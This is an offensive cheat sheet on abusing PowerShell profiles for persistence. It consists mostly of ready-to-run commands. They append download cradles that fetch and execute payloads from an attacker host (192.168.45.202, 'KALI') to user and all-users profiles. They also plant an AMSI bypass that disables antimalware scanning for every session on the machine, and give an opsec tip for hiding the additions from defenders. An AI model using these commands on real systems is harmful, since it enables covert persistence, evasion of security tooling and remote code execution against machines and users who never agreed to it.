# PowerShell Profile Abuse

PowerShell profiles are scripts that run automatically every time a PS session starts. They're used for persistence and for pre-loading AMSI bypasses or other payloads without triggering any additional detection.

---

## Profile Locations

| Variable | Path | Scope | Admin? |
|----------|------|-------|--------|
| `$PROFILE.CurrentUserCurrentHost` | `C:\Users\<user>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` | Current user, PS console only | No |
| `$PROFILE.CurrentUserAllHosts` | `C:\Users\<user>\Documents\WindowsPowerShell\profile.ps1` | Current user, all PS hosts | No |
| `$PROFILE.AllUsersCurrentHost` | `C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1` | All users, PS console | Yes |
| `$PROFILE.AllUsersAllHosts` | `C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1` | All users, all PS hosts | Yes |

```powershell
# Check profile paths on target
$PROFILE | Select-Object *
```

---

## Persistence via Profile

Append a payload to an existing profile so it runs every new PS session. No admin needed for CurrentUser profiles.

```powershell
# Append a download cradle to current user's profile
$payload = "`nIEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')"
$payload | Out-File -Append $PROFILE.CurrentUserCurrentHost

# Or write a full AMSI bypass + payload:
$content = @'

# Auto-loaded bypass
(([Ref].Assembly.gettypes()|?{$_.Name-like'Amsi*utils'}).GetFields('NonPublic,Static')|?{$_.Name-like'amsiInit*ailed'}).SetValue($null,$true)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/stage2.ps1')
'@
$content | Out-File -Append $PROFILE.CurrentUserCurrentHost

# Confirm:
Get-Content $PROFILE.CurrentUserCurrentHost
```

---

## AllUsers Profile — AMSI bypass that affects every user

If you have admin, write the AMSI bypass to the AllUsers profile. Every PowerShell session on the machine will run it — including sessions opened by other users or services.

```powershell
# Requires admin
$amsiBypass = @'

# Loaded from profile
(([Ref].Assembly.gettypes()|?{$_.Name-like'Amsi*utils'}).GetFields('NonPublic,Static')|?{$_.Name-like'amsiInit*ailed'}).SetValue($null,$true)
'@
$amsiBypass | Out-File -Append $PROFILE.AllUsersAllHosts

# Verify:
Get-Content $PROFILE.AllUsersAllHosts
```

---

## Check if profiles exist and contain content

```powershell
# Check for modified profiles (look for unusual content):
Test-Path $PROFILE.CurrentUserCurrentHost
Test-Path $PROFILE.AllUsersAllHosts

Get-Content $PROFILE.CurrentUserCurrentHost -ErrorAction SilentlyContinue
Get-Content $PROFILE.AllUsersAllHosts -ErrorAction SilentlyContinue
```

---

## Bypass profiles (-NoProfile)

When running your OWN PowerShell sessions, use `-NoProfile` to avoid executing someone else's profile (e.g. a defensive hook):

```powershell
powershell -NoProfile -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI/payload.ps1')"
```

Also useful when you want a clean PS session without any corporate profile scripts interfering.

---

## Detection

Defenders look for:
- Profile files containing `IEX`, `DownloadString`, `Reflection`, `Assembly.Load`
- Newly created profile files (especially AllUsers)
- Profile modification timestamps

**Opsec tip:** Append to existing profiles rather than creating new files. If the profile already has content, your addition blends in.

---

## Creating the profile directory if it doesn't exist

Profile directories don't always exist by default:

```powershell
$dir = Split-Path $PROFILE.CurrentUserCurrentHost
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
```
